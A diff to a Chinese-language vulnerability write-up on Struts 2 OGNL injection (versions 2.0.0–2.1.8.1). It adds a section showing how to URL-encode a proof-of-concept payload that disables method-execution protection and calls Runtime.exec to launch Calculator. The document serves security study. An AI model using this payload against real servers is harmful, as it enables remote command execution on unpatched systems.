@@ -6,6 +6,8 @@
 
 强烈建议将Tomcat使用Tomcat7以下，这里我用的Tomcat6.0.20，高版本出现特殊符号会报错(4XX)
 
+当然高版本也是可以用的怎么说呢
+
 ## 漏洞影响版本
 
 Struts 2.0.0 - Struts 2.1.8.1
@@ -117,6 +119,16 @@ http://127.0.0.1:8080/login.action?(%27\u0023context[\%27xwork.MethodAccessor.de
 这里你可能会好奇为什么我的payload这个`@`符号明明没有在被过滤但是也用了`unicode`编码，这里的迭代器是来源于`TreeMap`是有序的
 
 ![](img/12.png)
+
+## 高版本触发
+
+只需要将一些关键字符url编码下即可
+
+```
+http://127.0.0.1:8080/login.action?(%27%5Cu0023context%5B%5C'xwork.MethodAccessor.denyMethodExecution%5C'%5D%5Cu003dfalse')(abc)(def)&('%5Cu0040java.lang.Runtime%40'%2B'getRuntime().exec(%5Cu0023aa)')(%5Cu0023aa%5Cu003d'open%5Cu0020-a%5Cu0020Calculator.app')('y4tacker')
+```
+
+
 
 ## 参考文章
 
